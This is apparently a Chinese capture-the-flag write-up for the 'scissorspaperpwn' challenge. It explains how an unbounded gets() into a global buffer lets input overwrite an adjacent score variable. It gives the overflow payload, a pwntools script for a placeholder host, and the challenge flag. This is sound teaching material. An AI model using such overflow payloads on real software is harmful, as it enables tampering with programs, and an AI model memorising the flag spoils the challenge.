# scissorspaperpwn

## 题目简述

石头剪刀布程序故意让 AI 始终获胜，正常逻辑无法把分数累加到 10。用户选择被读入全局 `char buf[32]`，但代码使用无长度限制的 `gets(buf)`；紧随其后的全局变量中包含 `score`，因此可以直接覆盖分数。

## 解题过程

输入需要以合法数字开头，使 `atoi(buf)` 仍返回 0、1 或 2，随后用足够长的填充覆盖 `score`。官方 payload 为：

```text
1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

`atoi` 将其解析为选择 `1`，而后面的字符越过 32 字节缓冲区，把 `score` 改成大于 10 的值。当前轮结束后 `while (score < 10)` 立即退出，程序进入打印 Flag 的胜利分支：

```python
from pwn import *

p = remote("HOST", PORT)
p.sendline(b"1 " + b"A" * 72)
p.interactive()
```

输出为：

```text
greyhats{Game_hacker_in_the_making?}
```

## 方法总结

- 核心技巧：用全局缓冲区溢出直接篡改相邻全局分数，而非劫持控制流。
- 识别信号：`gets` 写入固定数组，胜利条件依赖附近的可写计数器。
- 复用要点：保留合法数字前缀可让程序继续执行到检查点；数据导向攻击往往比构造 ROP 更简单稳定。
